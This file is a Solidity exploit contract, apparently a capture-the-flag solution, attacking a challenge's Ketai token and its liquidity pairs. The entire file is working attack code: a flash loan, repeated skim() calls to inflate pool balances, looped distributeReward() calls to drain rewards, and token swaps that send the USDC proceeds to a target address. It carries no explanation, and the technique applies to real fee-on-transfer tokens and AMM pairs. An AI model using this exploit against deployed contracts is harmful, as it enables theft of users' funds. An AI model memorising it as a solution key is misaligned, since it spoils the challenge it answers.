// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "src/Challenge.sol";

contract Exploit {
    Challenge immutable challenge;
    uint256 private constant FLASH_LOAN_AMOUNT = 4_900_000 * 1e18;
    uint256 private constant REPAYMENT_FACTOR = 1125; // 112.5%
    uint256 private constant REPAYMENT_DIVISOR = 1000;

    constructor(Challenge chal) payable {
        challenge = chal;
    }

    function exploit() external {
        // Initiate flash loan from Ketai-USDC pair
        uint256 amount0 = 0;
        uint256 amount1 = 0;
        if (challenge.ketaiUSDCPair().token0() == address(challenge.ketai())) {
            amount0 = FLASH_LOAN_AMOUNT;
        } else {
            amount1 = FLASH_LOAN_AMOUNT;
        }
        challenge.ketaiUSDCPair().swap(amount0, amount1, address(this), "123");

        // Sell remaining Ketai for USDC
        uint256 finalKetaiBalance = challenge.ketai().balanceOf(address(this));
        swapKetaiForUSDC(finalKetaiBalance);

        // Transfer USDC to target address
        challenge.usdc().transfer(challenge.randomFolks(), challenge.usdc().balanceOf(address(this)));
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(msg.sender == address(challenge.ketaiUSDCPair()), "Unauthorized callback");

        for (uint256 c = 0; c < 25; c++) {
            uint256 ketaiBalance = challenge.ketai().balanceOf(address(this));

            // Step 1: Transfer 10% of Ketai to USDT pair
            challenge.ketai().transfer(address(challenge.ketaiUSDTPair()), ketaiBalance / 10);

            // Step 2: Exploit skim function to manipulate balances
            for (uint256 i = 0; i < 200; i++) {
                challenge.ketaiUSDTPair().skim(address(challenge.ketaiUSDTPair()));
            }
            challenge.ketaiUSDTPair().skim(address(this));

            // Step 3: Swap 90% of Ketai for USDT
            swapKetaiForUSDT(ketaiBalance * 9 / 10);

            uint256 usdtBalance = challenge.usdt().balanceOf(address(this));

            // Step 4: Exploit distributeReward function
            for (uint256 i = 0; i < 100 / (c + 1); i++) {
                challenge.ketai().distributeReward();
            }

            // Step 5: Swap USDT back to Ketai
            swapUSDTForKetai(usdtBalance);
        }

        // Repay flash loan with fee
        uint256 repaymentAmount = FLASH_LOAN_AMOUNT * REPAYMENT_FACTOR / REPAYMENT_DIVISOR;
        require(challenge.ketai().balanceOf(address(this)) >= repaymentAmount, "Insufficient Ketai for repayment");
        challenge.ketai().transfer(address(challenge.ketaiUSDCPair()), repaymentAmount);
    }

    function swapKetaiForUSDT(uint256 amount) internal {
        challenge.ketai().approve(address(challenge.router()), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(challenge.ketai());
        path[1] = address(challenge.usdt());
        challenge.router().swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount, 0, path, address(this), block.timestamp
        );
    }

    function swapUSDTForKetai(uint256 amount) internal {
        challenge.usdt().approve(address(challenge.router()), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(challenge.usdt());
        path[1] = address(challenge.ketai());
        challenge.router().swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount, 0, path, address(this), block.timestamp
        );
    }

    function swapKetaiForUSDC(uint256 amount) internal {
        challenge.ketai().approve(address(challenge.router()), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(challenge.ketai());
        path[1] = address(challenge.usdc());
        challenge.router().swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount, 0, path, address(this), block.timestamp
        );
    }
}
